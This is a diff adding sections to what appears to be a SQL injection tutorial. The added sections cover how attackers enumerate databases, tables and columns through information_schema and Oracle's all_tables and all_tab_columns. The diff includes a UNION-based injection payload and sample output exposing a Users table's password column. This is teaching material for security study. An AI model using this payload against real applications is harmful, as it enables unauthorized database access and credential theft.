@@ -14,8 +14,49 @@ Mar 18 2018 09:11:49
 Copyright (c) Microsoft Corporation
 Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor
 ```
-## Enumerating using Information Schema
+## Enumerating using `information_schema` Database
 The `information_schema` database contains metadata about the database, tables, and columns present on the server, making it a crucial step for attackers to view or enumerate when performing SQL injection vulnerabilities.
+> Note: Most databases have an `information_schema` present, except for Oracle databases.
 
 There are a couple of ways an attacker can use the `information_schema` database to fingerprint the database:
-### Query `schemata` table to list all databases
+### Query `schemata` Table to List All Databases
+The table `schemata` in the `informatioN-schema` database contains information about all databases on the server. The `schema_name` column contains all the databases names currently present.
+```sql
+1' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
+```
+> Note: We are adding an extra dash (-) at the end, to show you that there is a space after (--).
+### Listing Contents of Databases
+An attacker can also query the `tables` in the `information_schema` database to view information about all the tables throughout the database. This table contains multiple columns, but the `TABLE_NAME` and `TABLE_SCHEMA` are the most important ones as they store the table names and the table's associated database.
+```sql
+SELECT * FROM information_schema.tables
+```
+This returns the following output:
+```txt
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+```
+Additionally, you can also inspect the table structure by submitting the following query:
+```sql
+SELECT * FROM information_schema.columns WHERE table_name='Users'
+```
+This returns the following output:
+```txt
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+```
+### Listing Contents of Oracle Databases
+On Oracle, you can find the same information as follows:
+- You can list tables by querying `all_tables`:
+```sql
+SELECT * FROM all_tables
+```
+- You can list columns by querying `all_tab_columns`:
+```sql
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+```
